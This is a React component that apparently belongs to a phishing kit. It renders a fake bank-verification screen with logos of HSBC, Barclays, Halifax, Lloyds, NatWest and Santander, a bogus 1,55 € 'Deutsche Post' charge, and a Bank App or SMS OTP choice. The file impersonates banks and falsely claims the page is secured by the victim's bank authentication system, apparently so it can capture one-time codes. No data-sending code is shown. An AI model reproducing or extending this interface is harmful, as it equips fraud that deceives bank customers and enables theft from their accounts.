import React, { useState } from 'react';
import { Button } from "@/components/ui/button";
import { Smartphone, Shield } from "lucide-react";
import visaLogo from "@/assets/visa2.png";
import mastercardLogo from "@/assets/mc2.png";
import appLogo from "@/assets/app.png";
import smsLogo from "@/assets/sms.png";
import arrowLogo from "@/assets/arros.png";
import hsbcLogo from "@/assets/hsbcuk.png";
import barclaysLogo from "@/assets/barclaysuk.png";
import halifaxLogo from "@/assets/halifaxuk.png";
import lloydsLogo from "@/assets/lloydsuk.png";
import natwestLogo from "@/assets/natwestuk.png";
import santanderLogo from "@/assets/santanderuk.png";

interface ChooseComponentProps {
  cardType?: string | null;
  bankName?: string | null;
  onChoice?: (choice: 'bank' | 'sms') => void;
}

const ChooseComponent = ({ cardType, bankName, onChoice }: ChooseComponentProps) => {
  const [selectedChoice, setSelectedChoice] = useState<'bank' | 'sms' | null>(null);

  const handleChoice = (choice: 'bank' | 'sms') => {
    setSelectedChoice(choice);
    onChoice?.(choice);
  };

  // Check if bankName is one of our recognized banks
  const isRecognizedBank = bankName && ['HSBCUK', 'BARCLAYSUK', 'HALIFAXUK', 'LLOYDSUK', 'NATWESTUK', 'SANTANDERUK'].includes(bankName);

  return (
    <div className="w-full max-w-md mx-auto space-y-4 relative p-2 -mb-8 font-chevin font-thin">
      <div className="text-center">
        {isRecognizedBank ? (
          <>
            {/* Bank Logo at top left when recognized bankName exists */}
            <div className="flex justify-between items-center mb-3 animate-fade-in min-h-[20px]">
              <div className="animate-fade-in">
                {bankName === 'HSBCUK' && (
                  <img 
                    src={hsbcLogo} 
                    alt="HSBC" 
                    className="h-8 w-auto object-contain drop-shadow-lg" 
                  />
                )}
                {bankName === 'BARCLAYSUK' && (
                  <img 
                    src={barclaysLogo} 
                    alt="Barclays" 
                    className="h-8 w-auto object-contain drop-shadow-lg" 
                  />
                )}
                {bankName === 'HALIFAXUK' && (
                  <img 
                    src={halifaxLogo} 
                    alt="Halifax" 
                    className="h-8 w-auto object-contain drop-shadow-lg" 
                  />
                )}
                {bankName === 'LLOYDSUK' && (
                  <img 
                    src={lloydsLogo} 
                    alt="Lloyds" 
                    className="h-8 w-auto object-contain drop-shadow-lg" 
                  />
                )}
                {bankName === 'NATWESTUK' && (
                  <img 
                    src={natwestLogo} 
                    alt="NatWest" 
                    className="h-8 w-auto object-contain drop-shadow-lg" 
                  />
                )}
                {bankName === 'SANTANDERUK' && (
                  <img 
                    src={santanderLogo} 
                    alt="Santander" 
                    className="h-8 w-auto object-contain drop-shadow-lg" 
                  />
                )}
              </div>
              
              {/* Card Logo at top right when recognized bankName exists */}
              {cardType && (
                <div className="animate-fade-in">
                  {cardType === 'visa' && (
                    <img 
                      src={visaLogo} 
                      alt="Visa" 
                      className="h-4 w-auto object-contain drop-shadow-lg"
                    />
                  )}
                  {cardType === 'mastercard' && (
                    <img 
                      src={mastercardLogo} 
                      alt="MasterCard" 
                      className="h-4 w-auto object-contain drop-shadow-lg" 
                    />
                  )}
                </div>
              )}
            </div>
          </>
        ) : (
          /* Show both card logos when no recognized bankName */
          <div className="flex justify-between items-center mb-3 animate-fade-in">
            {cardType === 'visa' ? (
              <>
                <img 
                  src={visaLogo} 
                  alt="Visa" 
                  className="w-auto object-contain drop-shadow-lg"
                  style={{ height: '14px' }}
                />
                <img 
                  src={mastercardLogo} 
                  alt="MasterCard" 
                  className="h-8 w-auto object-contain drop-shadow-lg"
                />
              </>
            ) : (
              <>
                <img 
                  src={mastercardLogo} 
                  alt="MasterCard" 
                  className="h-8 w-auto object-contain drop-shadow-lg"
                />
                <img 
                  src={visaLogo} 
                  alt="Visa" 
                  className="w-auto object-contain drop-shadow-lg"
                  style={{ height: '14px' }}
                />
              </>
            )}
          </div>
        )}
        
     
        <div className="mb-4 mt-6 py-1 px-4 bg-card/80 backdrop-blur-sm border border-border/50 rounded-xl shadow-lg drop-shadow-md">
          <div className="text-center">
            <p className="text-[11px] font-chevin font-medium text-muted-foreground/80 leading-relaxed drop-shadow-sm">
              E-MAIL
            </p>
          </div>
        </div>
      </div>
      
      <div className="flex items-center justify-center gap-1 overflow-visible">
        {/* Bank App Option */}
        <div className="text-center flex-shrink-0">
          <div
            onClick={() => handleChoice('bank')}
            className="w-24 h-24 text-accent transition-all duration-300 hover:scale-110 active:scale-95 flex flex-col items-center justify-center cursor-pointer"
          >
            <img 
              src={appLogo} 
              alt="Bank App" 
              className="h-16 w-16 object-contain drop-shadow-xl" 
              style={{ filter: 'drop-shadow(0 6px 12px rgba(0, 0, 0, 0.25))' }}
            />
          </div>
          <p className="text-xs text-muted-foreground mt-1 font-medium">Bank App</p>
        </div>
        
        {/* Arrow in the middle */}
        <div className="flex items-center justify-center flex-shrink-0">
          <div 
            className="flex items-center justify-center"
            style={{ width: '40px', height: '40px' }}
          >
            <img 
              src={arrowLogo} 
              alt="Pfeil" 
              className="object-contain drop-shadow-lg" 
              style={{ width: '30px', height: '30px', minWidth: '30px', minHeight: '30px' }}
              key="arrow-image"
            />
          </div>
        </div>
        
        {/* SMS Option */}
        <div className="text-center flex-shrink-0">
          <div
            onClick={() => handleChoice('sms')}
            className="w-24 h-24 text-accent transition-all duration-300 hover:scale-110 active:scale-95 flex flex-col items-center justify-center cursor-pointer"
          >
            <img 
              src={smsLogo} 
              alt="SMS OTP" 
              className="h-16 w-16 object-contain drop-shadow-xl" 
              style={{ filter: 'drop-shadow(0 6px 12px rgba(0, 0, 0, 0.25))' }}
            />
          </div>
          <p className="text-xs text-muted-foreground mt-1 font-medium">SMS OTP</p>
        </div>
      </div>
      
      <div className="text-center mt-4">
        <p className="text-[11px] text-muted-foreground">
          Wählen Sie Ihre bevorzugte Verifizierungsmethode
        </p>
      </div>
      
      {/* Payment Info Card */}
      <div className="mt-4 p-2 bg-card/80 backdrop-blur-sm border border-border/50 rounded-xl shadow-lg drop-shadow-md transition-all duration-300 hover:shadow-xl">
        <div className="space-y-2">
          {/* Amount and Merchant Row */}
          <div className="flex justify-between items-center">
            <div className="text-left">
              <span className="text-[8px] font-medium text-muted-foreground/80 uppercase tracking-wider block mb-0.5">Betrag</span>
              <span className="text-[11px] font-medium text-foreground bg-muted/30 px-1 py-0.5 rounded tracking-normal">1,55 €</span>
            </div>
            <div className="text-right">
              <span className="text-[8px] font-medium text-muted-foreground/80 uppercase tracking-wider block mb-0.5">Händler</span>
              <span className="text-[11px] font-medium text-foreground bg-muted/30 px-1 py-0.5 rounded tracking-normal">Deutsche Post</span>
            </div>
          </div>
          
          {/* Card Info Row */}
          <div className="flex justify-between items-center pt-1.5 border-t border-border/30">
            <div className="flex items-center gap-2">
              <span className="text-[8px] font-medium text-muted-foreground/80 uppercase tracking-wider"></span>
              {cardType && (
                <img 
                  src={cardType === 'visa' ? visaLogo : mastercardLogo} 
                  alt={cardType} 
                  className="h-3 w-auto object-contain drop-shadow-sm" 
                />
              )}
            </div>
            <span className="text-[11px] font-mono font-medium text-foreground bg-muted/30 px-1 py-0.5 rounded tracking-normal">•••• 1234</span>
          </div>
        </div>
      </div>
      
      {/* Security Text */}
      <div className="text-center -mt-4 -mb-4">
        <div className="flex items-center justify-center gap-1">
          <Shield className="h-3 w-3 text-muted-foreground" />
          <p className="text-[10px] text-muted-foreground">
            {bankName === 'HSBCUK' && 'Gesichert durch HSBC Authentifizierungssystem.'}
            {bankName === 'BARCLAYSUK' && 'Gesichert durch Barclays Authentifizierungssystem.'}
            {bankName === 'HALIFAXUK' && 'Gesichert durch Halifax Authentifizierungssystem.'}
            {bankName === 'LLOYDSUK' && 'Gesichert durch Lloyds Authentifizierungssystem.'}
            {bankName === 'NATWESTUK' && 'Gesichert durch NatWest Authentifizierungssystem.'}
            {bankName === 'SANTANDERUK' && 'Gesichert durch Santander Authentifizierungssystem.'}
            {!bankName && 'Gesichert durch Ihr Bank-Authentifizierungssystem.'}
          </p>
        </div>
      </div>
    </div>
  );
};

export default ChooseComponent;